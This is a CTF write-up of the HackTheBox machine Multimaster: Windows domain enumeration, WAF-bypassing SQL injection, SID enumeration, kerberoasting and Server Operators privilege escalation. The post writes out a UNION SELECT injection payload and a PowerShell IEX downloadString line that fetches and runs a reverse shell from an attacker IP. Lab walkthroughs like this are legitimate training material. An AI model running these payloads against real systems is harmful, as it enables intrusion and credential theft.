---
categories:
- CTF
layout: post
image:
  path: preview.png
media_subpath: /assets/posts/2025-07-20-multimaster-hackthebox
tags:
- hackthebox
- windows
- sqli
- waf
- asrep
- sid
- acl

title: multimaster @ HackTheBox
---
Multimaster is an insane-difficulty machine on [hackthebox.eu](https://www.hackthebox.eu). 
Initial access is gained through enumerating the website where a sql injection vulnerability is found, using this, we are able to gain a list of usernames, the real user is found by using the sql injection to dump the SID of the domain. Using the domain's SID, a user is found which allows us to perform an asrep attack, gaining their hash and cracking it for initial access. Root is gained by enumerating the processes where a process named 'code' is found, further enumeration of the box allows us to find a vulnerable plugin, exploiting this gains us the user cyork. Enumerating the inetpub directory, a API file named 'multimasterapi.dll' can be found, downloading this file and looking through strings provides a password. Spraying this password gives us access to the sbauer account.  sbauer has the permission GenericWrite over the Jorden account, allowing us to make this account kerberoastable. Finally, root is gained by abusing the server operator group, allowing us to write a custom binpath to a random service of our choosing, giving us root access.

## User & Root Flag
This post is a walkthrough for multimaster, a insane machine on [hackthebox.eu](https://www.hackthebox.eu). 
The initial scan (`nmap -Pn -n -sC -sV -p- 10.129.176.220`) shows the following results:
```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: MegaCorp
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-24 16:45:05Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds  Windows Server 2016 Standard 14393 microsoft-ds (workgroup: MEGACORP)
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-info: 
|   10.129.176.220:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2025-07-24T16:46:10+00:00; +7m00s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.176.220:1433: 
|     Target_Name: MEGACORP
|     NetBIOS_Domain_Name: MEGACORP
|     NetBIOS_Computer_Name: MULTIMASTER
|     DNS_Domain_Name: MEGACORP.LOCAL
|     DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
|     DNS_Tree_Name: MEGACORP.LOCAL
|_    Product_Version: 10.0.14393
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-07-24T16:19:06
|_Not valid after:  2055-07-24T16:19:06
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGACORP.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-07-24T16:46:10+00:00; +7m00s from scanner time.
| ssl-cert: Subject: commonName=MULTIMASTER.MEGACORP.LOCAL
| Not valid before: 2025-07-23T16:18:24
|_Not valid after:  2026-01-22T16:18:24
| rdp-ntlm-info: 
|   Target_Name: MEGACORP
|   NetBIOS_Domain_Name: MEGACORP
|   NetBIOS_Computer_Name: MULTIMASTER
|   DNS_Domain_Name: MEGACORP.LOCAL
|   DNS_Computer_Name: MULTIMASTER.MEGACORP.LOCAL
|   DNS_Tree_Name: MEGACORP.LOCAL
|   Product_Version: 10.0.14393
|_  System_Time: 2025-07-24T16:46:00+00:00
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49699/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: MULTIMASTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-07-24T16:46:04
|_  start_date: 2025-07-24T16:18:32
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: MULTIMASTER
|   NetBIOS computer name: MULTIMASTER\x00
|   Domain name: MEGACORP.LOCAL
|   Forest name: MEGACORP.LOCAL
|   FQDN: MULTIMASTER.MEGACORP.LOCAL
|_  System time: 2025-07-24T09:46:02-07:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 1h07m00s, deviation: 2h38m45s, median: 6m59s
```

## initial access
Enumerating the website, a sql injection is found.
![capture-01](capture-01.PNG)

using sqlmap with the `tamper=charunicodeescape`, we are able to dump the database.<br>
**NOTE:** This can take some time because we have to use `--delay 3` due to the WAF.
![capture-02](capture-02.PNG)

With the database dumped, we crack the password using hashcat. Using an online hash detector, we find that the passwords are encrypted with `keccak`.
![capture-03](capture-03.PNG)
With the database passwords and usernames, we combine all the usernames into a list spraying the password.
![capture-04](capture-04.PNG)

Spraying the usernames and passwords yields no results. So back to the drawing board...
![capture-05](capture-05.PNG)
![capture-06](capture-06.PNG)

Another technique I found was the ability to use sql injection with MSSQL, we are able to dump the SID of the domain controller which allows us to enumerate potential users with the SID of the domain.
Using `UNION SELECT 1,sys.fn_varbintohexstr(SUSER_SID('MEGACORP\Domain Admins')),3,4,5--`, we are able to confirm this theory.
![capture-07](capture-07.PNG)
Using a custom script to enumerate all the SIDs on the domain, we are able to find a couple potential users.
```
svc-nas
Privileged IT Accounts
tushikikatomo
andrew
lana
```

Spraying the old passwords with these new users, gives us access to the tushikikatomo account.
![capture-08](capture-08.PNG)
![capture-09](capture-09.PNG)
## tushikikatomo
After gaining access to the tusk account through win-rm, we run winpeas and found a few weird local-services running.
![capture-10](capture-10.PNG)
Further analysis of the process list confirms this.
![capture-11](capture-11.PNG)

For this part, I gain another reverse shell just to allow smoother exploitation of this vulnerability.<br>
(you can probably skip this step honestly)
![capture-12](capture-12.PNG)
After a **LOT** of enumeration, you will eventually find the Microsoft Visual Studio directory, looking online and you will eventually find `cefdebug.exe`.<br>
https://github.com/taviso/cefdebug
This allows us to attach a debugger to these processes to run local commands.
![capture-13](capture-13.PNG)
**beaware**, these debug ports change, so you have to be very fast at exploiting them. Additionally the ping to my local machine **did not work**.

To exploit this vulnerability, using a small code snippet from the link provided earlier, we can use the following:
```
process.mainModule.require('child_process').exec('calc')
```

but instead of calc, we run a reverse shell.
Because Windows is Windows, we have to encode our reverse shell with little endian.
```
echo "IEX(New-Object Net.WebClient).downloadString('http://10.10.16.3:8080/reverse.ps1')" | iconv -t UTF-16LE | base64 -w 0
```
![capture-15](capture-15.PNG)
What this command does is convert the payload with 16 bit little-endian, without it, the shell will not work.
With this, we can use powershell's `-enc` command to execute the base64 payload.
![capture-16](capture-16.PNG)

## cyork
Once a reverse shell has been established, looking through the inetpub directory, an odd api file can be found.
![capture-17](capture-17.PNG)
Downloading this file to our local machine, we can use `strings -e l`, -e is an encoding method and -l is little-endian 16bit.
With this, we reveal a password.
![capture-18](capture-18.PNG)
Spraying this password, we find that we gain access to the sbauer account.
![capture-19](capture-19.PNG)

## sbauer
After uploading SharpHound, running it and then downloading the zip file, we can use bloodhound to enumerate the domain and users.
![capture-20](capture-20.PNG)

Looking up the sbauer account, we have GenericWrite over the user `jorden`.
This allows us to make the account kerberoast-able.
![capture-21](capture-21.PNG)
Adding a fake SPN, we perform a kerberoast on the account to gain the users hash.
![capture-22](capture-22.PNG)

After cracking the password and connecting via winrm, we gain access over the jorden account.
(you can also perform a PTH if you're lazy.)

## jorden
With the jorden account, checking our privileges, we see that we have `server operator`, this allows us to control services, with this, we can edit the binpath to a file that we control, such as netcat.
![capture-26](capture-26.PNG)
Uploading nc.exe to the machine and putting it inside `C:\Temp` in case AppLocker prevents us from running it, we are able to gain root access.
![capture-24](capture-24.PNG)
![capture-25](capture-25.PNG)
**NOTE:** if for whatever reason it says something along the lines of `x service is not enabled`, run `sc.exe config SERVICENAME start= demand`, and that should fix that issue.
https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/sc-config